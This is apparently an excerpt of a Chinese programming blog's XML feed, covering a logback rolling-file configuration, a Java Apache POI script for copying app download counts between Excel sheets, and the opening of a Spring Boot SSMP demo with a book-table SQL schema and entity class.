    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;timeFile&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span>
        <span class="hljs-comment">&lt;!--TimeBasedRollingPolicy  基于时间的滚动策略--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">rollingPolicy</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">fileNamePattern</span>&gt;</span>log/log-%d&#123;yyyy-MM-dd-HH&#125;.log<span class="hljs-tag">&lt;/<span class="hljs-name">fileNamePattern</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">rollingPolicy</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss.SSS&#125; %level [%thread]-%class:%line&gt;&gt;%msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">charset</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">charset</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;stdout&quot;</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;timeFile&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre>

<h2 id="在sercie实现类创建Logger对象，输⼊⽇志"><a href="#在sercie实现类创建Logger对象，输⼊⽇志" class="headerlink" title="在sercie实现类创建Logger对象，输⼊⽇志"></a>在sercie实现类创建Logger对象，输⼊⽇志</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719162517298.png" alt="image-20220719162517298"></p>
<p>日志会被记录到项目的&#x2F;log目录下，且是按每日记录</p>
<pre><code class="hljs xml">log/log-%d&#123;yyyy-MM-dd-HH&#125;.log</code></pre>



]]></content>
      <categories>
        <category>javaweb</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>tools</title>
    <url>/2023/09/21/tools/</url>
    <content><![CDATA[<p>科研路上的有用的小工具</p>
<h1 id="读取excel文件内容"><a href="#读取excel文件内容" class="headerlink" title="读取excel文件内容"></a>读取excel文件内容</h1><p>pom文件</p>
<pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Apache POI for Excel --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.poi<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>poi<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- 使用适当的版本 --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.poi<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>poi-ooxml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- 使用适当的版本 --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<p>脚本如下，写的有点乱，不过自己能看懂是什么意思就行，可能就是一次性的脚本，下次拿来改改还能用</p>
<pre><code class="hljs java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(String filePath1, String filePath2)</span> <span class="hljs-keyword">throws</span> IOException&#123;
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath1)) &#123; <span class="hljs-comment">// 替换为您的Excel文件路径</span>
            <span class="hljs-type">Workbook</span> <span class="hljs-variable">workbook</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XSSFWorkbook</span>(fileIn);
            HashMap&lt;String, String&gt; cache = getData(filePath1, filePath2);
            <span class="hljs-comment">// 获取第二个工作表（Sheet2）</span>
            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> workbook.getSheetAt(<span class="hljs-number">1</span>); <span class="hljs-comment">// Sheet2的索引是1</span>
            <span class="hljs-comment">// 遍历工作表的每一行</span>

            <span class="hljs-comment">// 获取第一个工作表（Sheet2）</span>
            sheet = workbook.getSheetAt(<span class="hljs-number">0</span>); <span class="hljs-comment">// Sheet2的索引是1</span>
            <span class="hljs-comment">// 在第E列（第5列）写入数据</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">columnEIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span>; <span class="hljs-comment">// 列的索引，从0开始计数</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">rowIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>; <span class="hljs-comment">// 从第一行开始，可以根据需要更改行索引</span>
            <span class="hljs-keyword">for</span> (rowIndex = <span class="hljs-number">5</span>; rowIndex &lt; <span class="hljs-number">237</span>; rowIndex++) &#123;
                <span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> sheet.getRow(rowIndex);
                <span class="hljs-keyword">if</span> (row == <span class="hljs-literal">null</span>) &#123;
                    row = sheet.createRow(rowIndex);
                &#125;
                <span class="hljs-comment">// 获取指定单元格并设置数据</span>
                <span class="hljs-type">Cell</span> <span class="hljs-variable">cell</span> <span class="hljs-operator">=</span> row.getCell(columnEIndex);
                <span class="hljs-keyword">if</span> (cell == <span class="hljs-literal">null</span>) &#123;
                    cell = row.createCell(columnEIndex);
                &#125;

                <span class="hljs-comment">// 获取第一列的app名称</span>
                <span class="hljs-type">Row</span> <span class="hljs-variable">row1</span> <span class="hljs-operator">=</span> sheet.getRow(rowIndex);
                <span class="hljs-type">Cell</span> <span class="hljs-variable">cell1</span> <span class="hljs-operator">=</span> row1.getCell(<span class="hljs-number">1</span>);
                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> cell1.getStringCellValue();
                <span class="hljs-comment">// wechatv8.0.11 格式,使用split获取前面的名字</span>
                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;v&quot;</span>)) &#123;
                    name = name.split(<span class="hljs-string">&quot;v&quot;</span>)[<span class="hljs-number">0</span>];
                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;V&quot;</span>)) &#123;
                    name = name.split(<span class="hljs-string">&quot;V&quot;</span>)[<span class="hljs-number">0</span>];
                &#125;

                <span class="hljs-comment">// 根据app的名称获取下载量,并对数据进行处理</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(name);
                <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(value)) &#123;
                    value = <span class="hljs-string">&quot;&quot;</span>;
                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value.contains(<span class="hljs-string">&quot;E&quot;</span>)) &#123;
                    value = science2String(value);
                    value = simplifyNumber(Long.parseLong(value));
                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!value.equals(<span class="hljs-string">&quot;0&quot;</span>)) &#123;
                    value = simplifyNumber(Long.parseLong(value));
                &#125;
                System.out.println(name + <span class="hljs-string">&quot;:&quot;</span> + value);
<span class="hljs-comment">//                cellValue = cell.getStringCellValue();</span>
                cell.setCellValue(value);
<span class="hljs-comment">//                     设置单元格颜色 可设可不设</span>
<span class="hljs-comment">//                    cell.setCellValue(value);</span>
<span class="hljs-comment">//                    CellStyle cellStyle = workbook.createCellStyle();</span>
<span class="hljs-comment">//                    cellStyle.setFillForegroundColor(IndexedColors.GREEN.getIndex());</span>
<span class="hljs-comment">//                    cellStyle.setFillPattern(FillPatternType.SOLID_FOREGROUND);</span>
<span class="hljs-comment">//                    cell.setCellStyle(cellStyle);</span>

            &#125;
            <span class="hljs-comment">// 保存工作簿到文件</span>
            <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath1)) &#123;
                workbook.write(fileOut);
                System.out.println(<span class="hljs-string">&quot;数据已成功覆盖Excel文件中的单元格！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
                e.printStackTrace();
            &#125;
            workbook.close();
        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;String, String&gt; <span class="hljs-title function_">getData</span><span class="hljs-params">(String filePath, String filePath2)</span> <span class="hljs-keyword">throws</span> IOException &#123;
        HashMap&lt;String, String&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath)) &#123; <span class="hljs-comment">// 替换为您的Excel文件路径</span>
            <span class="hljs-type">Workbook</span> <span class="hljs-variable">workbook</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XSSFWorkbook</span>(fileIn);

            <span class="hljs-comment">// 获取第二个工作表（Sheet2）</span>
            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> workbook.getSheetAt(<span class="hljs-number">5</span>); <span class="hljs-comment">// Sheet2的索引是1</span>
            System.out.println(sheet.getSheetName());
            <span class="hljs-comment">// 遍历工作表的每一行</span>
            <span class="hljs-type">int</span>[] rows = getRowNum(filePath2);
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; k &lt; rows.length; k += <span class="hljs-number">2</span>) &#123;
                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; j &lt; rows[k]; j++) &#123;
                        <span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> sheet.getRow(j);
                        <span class="hljs-comment">// 假设第一列是名称，第二列是下载量</span>
                        <span class="hljs-type">Cell</span> <span class="hljs-variable">nameCell</span> <span class="hljs-operator">=</span> row.getCell(k);
                        <span class="hljs-type">Cell</span> <span class="hljs-variable">downloadCell</span> <span class="hljs-operator">=</span> row.getCell(k + <span class="hljs-number">1</span>);

                        <span class="hljs-comment">// 检查单元格类型，确保是字符串和数值</span>
                        <span class="hljs-keyword">if</span> (nameCell != <span class="hljs-literal">null</span> &amp;&amp;
                                downloadCell != <span class="hljs-literal">null</span>) &#123;
                            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> nameCell.getStringCellValue();
                            <span class="hljs-type">String</span> <span class="hljs-variable">download</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;

                            <span class="hljs-keyword">if</span> (downloadCell.getCellTypeEnum() == CellType.NUMERIC) &#123;
                                download = String.valueOf(downloadCell.getNumericCellValue());
                            &#125;
                            <span class="hljs-keyword">if</span> (downloadCell.getCellTypeEnum() == CellType.STRING) &#123;
                                download = downloadCell.getStringCellValue();
                            &#125;
                            cache.put(name, download);
                            <span class="hljs-comment">// 打印名称和下载量</span>
                            System.out.println(<span class="hljs-string">&quot;名称: &quot;</span> + name);
                            System.out.println(<span class="hljs-string">&quot;下载量: &quot;</span> + download);
                        &#125;
                    &#125;
                &#125;
            &#125;
        <span class="hljs-keyword">return</span> cache;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 将具体数字转换成 K,M,E 为单位的数字</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> number</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">simplifyNumber</span><span class="hljs-params">(<span class="hljs-type">long</span> number)</span> &#123;
        <span class="hljs-keyword">if</span> (number &lt; <span class="hljs-number">1_000</span>) <span class="hljs-keyword">return</span> String.valueOf(number);
        <span class="hljs-keyword">if</span> (number &lt; <span class="hljs-number">1_000_000</span>) <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;%.1fK+&quot;</span>, number / <span class="hljs-number">1_000.0</span>);
        <span class="hljs-keyword">if</span> (number &lt; <span class="hljs-number">1_000_000_000</span>) <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;%.1fM+&quot;</span>, number / <span class="hljs-number">1_000_000.0</span>);
        <span class="hljs-keyword">if</span> (number &lt; <span class="hljs-number">1_000_000_000_000L</span>) <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;%.1fE+&quot;</span>, number / <span class="hljs-number">1_000_000_000.0</span>);
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;%.1fB+&quot;</span>, number / <span class="hljs-number">1_000_000_000.0</span>);
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 获取每列有多少行有效数据</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] getRowNum(String filePath) <span class="hljs-keyword">throws</span> IOException &#123;
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> &#123;
            fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath));
        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        &#125;
        <span class="hljs-type">Workbook</span> <span class="hljs-variable">workbook</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XSSFWorkbook</span>(fis);
        <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> workbook.getSheetAt(<span class="hljs-number">5</span>); <span class="hljs-comment">// Assuming you&#x27;re reading the first sheet</span>

        Iterator&lt;Row&gt; rowIterator = sheet.iterator();
        <span class="hljs-type">int</span>[] columnRowCounts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[sheet.getRow(<span class="hljs-number">0</span>).getLastCellNum()]; <span class="hljs-comment">// Assuming the first row has the maximum number of columns</span>

        <span class="hljs-keyword">while</span> (rowIterator.hasNext()) &#123;
            <span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> rowIterator.next();
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; columnRowCounts.length; i += <span class="hljs-number">2</span>) &#123;
                <span class="hljs-type">Cell</span> <span class="hljs-variable">cell</span> <span class="hljs-operator">=</span> row.getCell(i, Row.MissingCellPolicy.RETURN_BLANK_AS_NULL);
                <span class="hljs-keyword">if</span> (cell == <span class="hljs-literal">null</span> || cell.toString().trim().isEmpty()) &#123;
                    <span class="hljs-keyword">continue</span>;
                &#125;
                columnRowCounts[i]++;
            &#125;
        &#125;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; columnRowCounts.length; i += <span class="hljs-number">2</span>) &#123;
            System.out.println(<span class="hljs-string">&quot;Column &quot;</span> + (i + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot; has &quot;</span> + columnRowCounts[i] + <span class="hljs-string">&quot; rows.&quot;</span>);
        &#125;
        workbook.close();
        fis.close();
        <span class="hljs-keyword">return</span> columnRowCounts;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">science2String</span><span class="hljs-params">(String scientificNumber)</span> &#123;
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(scientificNumber);
        <span class="hljs-keyword">return</span> number.toPlainString();
    &#125;</code></pre>



]]></content>
      <categories>
        <category>java, python</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot_demo</title>
    <url>/2022/04/17/springboot-demo/</url>
    <content><![CDATA[<h1 id="springboot-demo"><a href="#springboot-demo" class="headerlink" title="springboot demo"></a>springboot demo</h1><p>使用springboot整合SSMP</p>
<h2 id="1-项目需求"><a href="#1-项目需求" class="headerlink" title="1.项目需求"></a>1.项目需求</h2><p>项目最终实现的页面</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417232613669.png" alt="image-20220417232613669"></p>
<p>​	整体案例中需要采用的技术如下：</p>
<blockquote>
<ol>
<li>Dao开发————整合MyBatisPlus，制作数据层测试</li>
<li>Service开发————基于MyBatisPlus进行增量开发，制作业务层测试类</li>
<li>Controller开发————基于Restful开发，使用PostMan测试接口功能</li>
<li>Controller开发————前后端开发协议制作</li>
<li>页面开发————基于VUE+ElementUI制作，前后端联调，页面数据处理，页面消息处理<ul>
<li>列表</li>
<li>新增</li>
<li>修改</li>
<li>删除</li>
<li>分页</li>
<li>查询</li>
</ul>
</li>
<li>项目异常处理</li>
<li>按条件查询————页面功能调整、Controller修正功能、Service修正功能</li>
</ol>
</blockquote>
<h2 id="2-创建springboot的web项目"><a href="#2-创建springboot的web项目" class="headerlink" title="2.创建springboot的web项目"></a>2.创建springboot的web项目</h2><h3 id="新建模块"><a href="#新建模块" class="headerlink" title="新建模块"></a>新建模块</h3><p><code>File-&gt;new-&gt;module</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214418622.png" alt="image-20220417214418622"></p>
<p>这里没什么需要改的，只需要修改使用的java版本</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214706594.png" alt="image-20220417214706594"></p>
<p>选择所需要的依赖，选择后springboot就可以自动导入相关坐标，无需手动导入</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214851951.png" alt="image-20220417214851951"></p>
<p>&#x3D;&#x3D;注意将配置文件改为yml类型&#x3D;&#x3D;</p>
<p><strong>application.yml</strong></p>
<pre><code class="hljs yaml"><span class="hljs-comment"># 修改配置将tomcat的端口改为80</span>
<span class="hljs-attr">server:</span> 
	<span class="hljs-attr">port:</span> <span class="hljs-number">80</span></code></pre>



<h2 id="3-开发流程"><a href="#3-开发流程" class="headerlink" title="3.开发流程"></a>3.开发流程</h2><h3 id="实体类开发"><a href="#实体类开发" class="headerlink" title="实体类开发"></a>实体类开发</h3><p>数据库资源</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- ----------------------------</span>
<span class="hljs-comment">-- Table structure for tbl_book</span>
<span class="hljs-comment">-- ----------------------------</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `tbl_book`;
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tbl_book`  (
  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `type` <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `description` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`) <span class="hljs-keyword">USING</span> BTREE
) ENGINE <span class="hljs-operator">=</span> InnoDB AUTO_INCREMENT <span class="hljs-operator">=</span> <span class="hljs-number">51</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> <span class="hljs-operator">=</span> utf8 <span class="hljs-keyword">COLLATE</span> <span class="hljs-operator">=</span> utf8_general_ci ROW_FORMAT <span class="hljs-operator">=</span> <span class="hljs-keyword">Dynamic</span>;

<span class="hljs-comment">-- ----------------------------</span>
<span class="hljs-comment">-- Records of tbl_book</span>
<span class="hljs-comment">-- ----------------------------</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring实战 第5版&#x27;</span>, <span class="hljs-string">&#x27;Spring入门经典教程，深入理解Spring原理技术内幕&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring 5核心原理与30个类手写实战&#x27;</span>, <span class="hljs-string">&#x27;十年沉淀之作，手写Spring精华思想&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring 5 设计模式&#x27;</span>, <span class="hljs-string">&#x27;深入Spring源码剖析Spring源码中蕴含的10大设计模式&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring MVC+MyBatis开发从入门到项目实战&#x27;</span>, <span class="hljs-string">&#x27;全方位解析面向Web应用的轻量级框架，带你成为Spring MVC开发高手&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;轻量级Java Web企业应用实战&#x27;</span>, <span class="hljs-string">&#x27;源码级剖析Spring框架，适合已掌握Java基础的读者&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Java核心技术 卷I 基础知识（原书第11版）&#x27;</span>, <span class="hljs-string">&#x27;Core Java 第11版，Jolt大奖获奖作品，针对Java SE9、10、11全面更新&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;深入理解Java虚拟机&#x27;</span>, <span class="hljs-string">&#x27;5个维度全面剖析JVM，大厂面试知识点全覆盖&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Java编程思想（第4版）&#x27;</span>, <span class="hljs-string">&#x27;Java学习必读经典,殿堂级著作！赢得了全球程序员的广泛赞誉&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;零基础学Java（全彩版）&#x27;</span>, <span class="hljs-string">&#x27;零基础自学编程的入门图书，由浅入深，详解Java语言的编程思想和核心技术&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播就该这么做：主播高效沟通实战指南&#x27;</span>, <span class="hljs-string">&#x27;李子柒、李佳琦、薇娅成长为网红的秘密都在书中&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">11</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播销讲实战一本通&#x27;</span>, <span class="hljs-string">&#x27;和秋叶一起学系列网络营销书籍&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播带货：淘宝、天猫直播从新手到高手&#x27;</span>, <span class="hljs-string">&#x27;一本教你如何玩转直播的书，10堂课轻松实现带货月入3W+&#x27;</span>);</code></pre>

<p><code>tbl_book</code>对应的实体类如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-meta">@Data</span>
<span class="hljs-comment">// Data注解可以可以完成所有属性的setter getter toString，equals，hashCode方法</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Book</span> &#123;
    <span class="hljs-keyword">private</span> Integer id;
    <span class="hljs-keyword">private</span> String type;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String description;
&#125;</code></pre>

<p>为了方便开发使用<code>lombok</code>注解，在pom.xml添加坐标</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!--lombok--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre>



